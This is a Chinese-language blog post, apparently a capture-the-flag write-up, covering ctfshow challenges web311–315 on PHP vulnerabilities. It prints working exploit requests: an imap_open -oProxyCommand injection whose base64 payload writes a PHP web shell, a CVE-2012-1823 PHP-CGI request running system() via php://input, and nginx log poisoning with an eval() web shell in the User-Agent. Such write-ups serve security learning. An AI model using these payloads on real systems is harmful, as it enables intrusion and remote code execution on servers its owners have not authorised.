@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web311PHP-fpm 远程代码执行漏洞(CVE-2019-11043)，使用这个工具就可以命令执行啦。这就是 PWN 👴的世界吗？i了i了   web312PHP imap 远程命令执行漏洞（CVE-2018-19518）。    php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Practice - CTFSHOW WEB入门 PHP-CVE篇">
+<meta property="og:url" content="https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/index.html">
+<meta property="og:site_name" content="Recharging Runtime">
+<meta property="og:description" content="web311PHP-fpm 远程代码执行漏洞(CVE-2019-11043)，使用这个工具就可以命令执行啦。这就是 PWN 👴的世界吗？i了i了   web312PHP imap 远程命令执行漏洞（CVE-2018-19518）。    php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-06-03T21:29:56.000Z">
+<meta property="article:modified_time" content="2022-06-18T14:55:32.365Z">
+<meta property="article:author" content="b_y">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Practice">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Practice - CTFSHOW WEB入门 PHP-CVE篇</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Recharging Runtime" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/06/03/ctfshow-web-getting-started-java/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/06/03/ctfshow-web-getting-started-file-upload/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&text=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&title=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&is_video=false&description=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Practice - CTFSHOW WEB入门 PHP-CVE篇&body=Check out this article: https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&title=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&title=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&title=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&title=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&name=Practice - CTFSHOW WEB入门 PHP-CVE篇&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&t=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web311"><span class="toc-number">1.</span> <span class="toc-text">web311</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web312"><span class="toc-number">2.</span> <span class="toc-text">web312</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web313"><span class="toc-number">3.</span> <span class="toc-text">web313</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web314"><span class="toc-number">4.</span> <span class="toc-text">web314</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web315"><span class="toc-number">5.</span> <span class="toc-text">web315</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Practice - CTFSHOW WEB入门 PHP-CVE篇
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">b_y</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-03T21:29:56.000Z" itemprop="datePublished">2022-06-04</time>
+        
+        (Updated: <time datetime="2022-06-18T14:55:32.365Z" itemprop="dateModified">2022-06-18</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Practice/" rel="tag">Practice</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="web311"><a href="#web311" class="headerlink" title="web311"></a>web311</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1063/">PHP-fpm 远程代码执行漏洞(CVE-2019-11043)</a>，使用<a target="_blank" rel="noopener" href="https://github.com/neex/phuip-fpizdam">这个工具</a>就可以命令执行啦。<del>这就是 PWN 👴的世界吗？i了i了</del>  </p>
+<h2 id="web312"><a href="#web312" class="headerlink" title="web312"></a>web312</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lhh134/article/details/88542587">PHP imap 远程命令执行漏洞（CVE-2018-19518）</a>。  </p>
+<blockquote>
+<p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。  </p>
+</blockquote>
+<p>在服务器地址参数中注入 <code>oProxyCommand</code> 参数 rce。  </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d739c103-0c04-441f-9476-20b843dc5692.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>180</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://d739c103-0c04-441f-9476-20b843dc5692.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://d739c103-0c04-441f-9476-20b843dc5692.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=18055a59ade621-0332e63e4c56e2-9771539-240000-18055a59adf528; __e_inc=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">hostname<span class="operator">=</span><span class="keyword">x</span>+-oProxyCommand<span class="variable">%3</span>decho<span class="variable">%09</span>ZWNobyAiUEQ<span class="number">5</span>d<span class="number">2</span>FIQWdRR<span class="number">1</span>YyWVd<span class="number">3</span>b<span class="number">0</span>pGOVFUMU<span class="number">5</span>VV<span class="number">3</span>pGZEtUc<span class="number">2</span>ciIHwgYmFzZTY<span class="number">0</span>IC<span class="number">1</span>kID<span class="number">4</span>vdmFyL<span class="number">3</span>d<span class="number">3</span>dy<span class="number">9</span>odG<span class="number">1</span>sL<span class="number">3</span>NoZWwucGhw|base<span class="number">64</span><span class="variable">%09</span>-d|sh&#125;&amp;username<span class="operator">=</span>aaaa&amp;password<span class="operator">=</span>aaaaa</span></span><br></pre></td></tr></table></figure>
+
+<p>注：包括在 <code>x+-oProxyCommand%3decho%09编码后的内容|base64%09-d|sh&#125;</code> 之间的 base64 编码内容不能有 <code>+ =</code>，这里踩了坑。<br>访问 shel.php 执行 env 获取 flag。  </p>
+<h2 id="web313"><a href="#web313" class="headerlink" title="web313"></a>web313</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/111824777">PHP-CGI远程代码执行漏洞（CVE-2012-1823）</a>，构造复现即可，这 flag 挺能藏啊。  </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1b3f5512-7681-44c4-98e2-3d8f96508bea.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>44</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://1b3f5512-7681-44c4-98e2-3d8f96508bea.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1b3f5512-7681-44c4-98e2-3d8f96508bea.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=18055a59ade621-0332e63e4c56e2-9771539-240000-18055a59adf528; __e_inc=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /somewhere/fla9.txt&#x27;</span>);</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="web314"><a href="#web314" class="headerlink" title="web314"></a>web314</h2><p>日志包含。  </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?f=/var/log/nginx/access.log</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>89eeea9d-8f60-4ec2-8996-fcc3d4c1a46e.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36&lt;?php @eval($_POST[1]); ?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://89eeea9d-8f60-4ec2-8996-fcc3d4c1a46e.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=18055a59ade621-0332e63e4c56e2-9771539-240000-18055a59adf528; __e_inc=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web315"><a href="#web315" class="headerlink" title="web315"></a>web315</h2><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce">XDebug 远程调试漏洞（代码执行）</a>，ctfshow的环境复现失败，vulhub 也复现失败，:8080 的 phpinfo 打不开。</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web311"><span class="toc-number">1.</span> <span class="toc-text">web311</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web312"><span class="toc-number">2.</span> <span class="toc-text">web312</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web313"><span class="toc-number">3.</span> <span class="toc-text">web313</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web314"><span class="toc-number">4.</span> <span class="toc-text">web314</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web315"><span class="toc-number">5.</span> <span class="toc-text">web315</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&text=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&title=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&is_video=false&description=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Practice - CTFSHOW WEB入门 PHP-CVE篇&body=Check out this article: https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&title=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&title=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&title=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&title=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&name=Practice - CTFSHOW WEB入门 PHP-CVE篇&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-php-cve/&t=Practice - CTFSHOW WEB入门 PHP-CVE篇"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    b_y
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.7/dist/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'recharging-runtime';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
